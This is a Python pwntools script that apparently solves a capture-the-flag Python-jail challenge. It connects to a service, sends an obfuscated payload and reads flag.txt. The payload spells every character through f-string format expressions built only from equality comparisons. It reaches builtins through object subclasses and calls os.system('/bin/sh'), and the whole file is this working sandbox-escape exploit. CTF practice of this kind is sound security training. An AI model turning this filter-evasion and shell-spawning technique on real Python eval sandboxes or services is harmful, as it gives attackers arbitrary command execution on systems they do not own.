#!/usr/bin/env python3
import os

from pwn import *

HOST = "avatar"
PORT = os.environ.get("PORT", "1337")

context.log_level = "error"


ONE = "({}=={})"
TWO = "(({}=={})+({}=={}))"


def getNumber(n):
    out = f"{ONE}"
    for x in f"{n:b}"[1:]:
        if x == "1":
            out = f"(({out}*{TWO})+{ONE})"
        else:
            out = f"({out}*{TWO})"
    return out


def genCharacter(c):
    return 'f"{' + getNumber(ord(c)) + ':c}"'


payload = "[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if 'wrapper' not in f'{x.__init__}' and 'builtins' in x.__init__.__globals__ ][0]['builtins'].__import__('os').system('/bin/sh')"
exploit = "+".join([genCharacter(x) for x in payload])

try:
    io = remote(HOST, PORT)
    io.recvuntil(b"input: ")
    io.sendline(exploit.encode("ascii"))
    io.recvuntil(b"$", timeout=5)
    io.sendline(b"cat flag.txt")
    output = io.recvall(timeout=5).decode("ascii")
    print(output)
finally:
    io.close()
